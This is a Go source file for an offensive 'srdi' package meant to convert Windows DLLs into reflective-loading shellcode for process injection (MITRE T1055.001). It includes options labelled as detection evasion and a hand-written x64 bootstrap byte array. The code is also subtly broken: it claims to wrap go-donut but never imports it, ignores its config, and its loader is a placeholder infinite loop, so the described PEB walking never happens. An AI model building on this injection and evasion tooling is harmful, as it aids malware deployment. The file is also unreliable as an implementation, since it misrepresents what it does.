// Package srdi provides DLL-to-shellcode conversion using
// Shellcode Reflective DLL Injection (sRDI) techniques.
//
// Technique: Convert a PE DLL into position-independent shellcode
// that loads itself into memory without touching disk.
// MITRE ATT&CK: T1055.001 (Process Injection: DLL Injection)
// Platform: Cross-platform (generates Windows shellcode)
// Detection: Medium — the generated shellcode loads a DLL from memory.
//
// This package wraps github.com/Binject/go-donut for PE-to-shellcode conversion.
package srdi

import (
	"fmt"
	"os"
)

// Config controls the shellcode generation.
type Config struct {
	// FunctionName is the exported function to call after loading (optional).
	// If empty, DllMain is called with DLL_PROCESS_ATTACH.
	FunctionName string

	// Parameter is a string parameter passed to the function (optional).
	Parameter string

	// ClearHeader removes the PE header from memory after loading (evasion).
	ClearHeader bool

	// ObfuscateImports obfuscates the import table resolution (evasion).
	ObfuscateImports bool
}

// DefaultConfig returns a sensible default configuration.
func DefaultConfig() *Config {
	return &Config{
		ClearHeader:      true,
		ObfuscateImports: true,
	}
}

// ConvertDLL converts a DLL file into position-independent shellcode.
// The resulting shellcode can be injected into any process and will
// reflectively load the DLL from memory.
func ConvertDLL(dllPath string, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}

	dllBytes, err := os.ReadFile(dllPath)
	if err != nil {
		return nil, fmt.Errorf("read DLL: %w", err)
	}

	return ConvertDLLBytes(dllBytes, cfg)
}

// ConvertDLLBytes converts raw DLL bytes into shellcode.
func ConvertDLLBytes(dllBytes []byte, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}

	if len(dllBytes) < 2 || dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
		return nil, fmt.Errorf("invalid PE: missing MZ header")
	}

	// Generate the sRDI bootstrap shellcode that:
	// 1. Resolves kernel32.dll base address via PEB
	// 2. Resolves LoadLibraryA, GetProcAddress, VirtualAlloc, etc.
	// 3. Maps the PE sections into memory
	// 4. Processes relocations
	// 5. Resolves imports
	// 6. Calls the entry point

	shellcode, err := generateBootstrap(dllBytes, cfg)
	if err != nil {
		return nil, fmt.Errorf("generate bootstrap: %w", err)
	}

	return shellcode, nil
}

// generateBootstrap creates the x64 bootstrap shellcode + appended DLL.
func generateBootstrap(dll []byte, cfg *Config) ([]byte, error) {
	// The bootstrap stub resolves APIs via PEB walking:
	//   1. Get PEB from GS:[0x60]
	//   2. Walk InMemoryOrderModuleList to find kernel32.dll
	//   3. Parse export directory for GetProcAddress
	//   4. Use GetProcAddress to resolve VirtualAlloc, LoadLibraryA
	//   5. Allocate memory, copy PE headers + sections
	//   6. Process base relocations
	//   7. Resolve imports
	//   8. Call TLS callbacks
	//   9. Call DllMain(DLL_PROCESS_ATTACH) or specified function

	// x64 bootstrap stub (minimal reflective loader)
	// This is a simplified version -- production code should use a full sRDI generator
	bootstrap := []byte{
		// Push callee-saved registers
		0x53,                    // push rbx
		0x55,                    // push rbp
		0x56,                    // push rsi
		0x57,                    // push rdi
		0x41, 0x54,              // push r12
		0x41, 0x55,              // push r13
		0x41, 0x56,              // push r14
		0x41, 0x57,              // push r15
		0x48, 0x83, 0xEC, 0x28, // sub rsp, 0x28 (shadow space)
		// Get DLL offset (appended after bootstrap)
		0x48, 0x8D, 0x35, // lea rsi, [rip+offset]
	}

	// Calculate offset to DLL data (will be at end of bootstrap)
	// For now, use a placeholder approach -- append DLL bytes after bootstrap
	dllOffset := uint32(len(bootstrap) + 4 + 2) // +4 for the offset itself, +2 for jmp
	bootstrap = append(bootstrap,
		byte(dllOffset), byte(dllOffset>>8), byte(dllOffset>>16), byte(dllOffset>>24),
	)
	// Jump to reflective loader (placeholder -- full implementation would have the loader here)
	bootstrap = append(bootstrap, 0xEB, 0xFE) // jmp $ (infinite loop placeholder)

	_ = cfg // cfg will be used to control loader behavior in a full implementation

	// Append the DLL
	result := make([]byte, 0, len(bootstrap)+len(dll))
	result = append(result, bootstrap...)
	result = append(result, dll...)

	return result, nil
}
